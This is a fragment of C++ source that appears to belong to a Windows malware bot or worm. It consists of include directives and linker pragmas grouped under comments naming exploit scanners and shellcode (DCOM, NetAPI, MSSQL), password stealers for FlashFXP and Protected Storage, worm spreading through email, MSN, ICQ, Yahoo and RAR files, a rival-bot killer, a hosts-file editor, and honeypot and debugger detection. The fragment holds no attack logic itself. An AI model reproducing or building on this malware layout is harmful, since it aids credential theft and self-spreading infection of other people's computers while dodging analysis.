
// vInclude Files
#pragma comment(linker,"/ALIGN:4096 /IGNORE:4108 /RELEASE /IGNORE:4089")
#pragma optimize("gsy", on)


#include <winsock2.h>
#include <sql.h>
#include <sqlext.h>
#include <iostream>
#include <string>
#include <sstream>
#include <stdarg.h>
#include <windows.h>
#include <vector>
#include <algorithm>
#include <lm.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <wininet.h>
#include <shellapi.h>
#include <winable.h>
#include <malloc.h>
#include <Lm.h>
#ifndef OPENSSL
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/md5.h>
#include <openssl/evp.h>
#endif
/* External includes*/
#include "externs.h"
/*External includes */

/* Scanner includes */
#include "scanner.h"
#include "Shellcode.h"
#include "dcom2.h"
#include "netapi.h"
#include "mssql.h"
#include "SecurityGateWay.h"
#include "CmailServer.h"

/* Scanner includes */

/* Threading system */
#include "thread.h"
/* Threading system */

/* Stealers */
#include "flashfxp.h"
DWORD WINAPI pstore (LPVOID param);
#import "pstorec.dll" no_namespace
#include "Psapi.h" 
#pragma comment(lib,"psapi.lib") 
/* Stealers */



/* WormRide & Includes*/
#include "ftp.h"
#include "SocketTest.h"
/* WormRide & Includes*/

/* Process shit */
#include "process.h"
/* process shit */


/* Start-Add-Delete service test */
#include "service.h"

/* Start-Add-Delete service test */

/* WORM */
#include "email.h"
#include "smtp.h"
#include "msn1.h"
#include "icqapi.h"
#include "yahoo.h"
#include "rarworm.h"


/* BotKiller */
#include "Killer.h"

/* hosts editor */
#include "hosts.h"

/* ident server */
#include "ident.h"


/* Others */
#include "misc.h"
#include "visit.h"

/* SSL SHIT*/
#include "ssl.h"

/* Encryption shit */
#include "blowfish.h"

/* Honeypot shit */
#include "Honeypot.h"
#include "BotDetect.h"

/* Debugger */
#include "detect.h"
using namespace std;
int ip();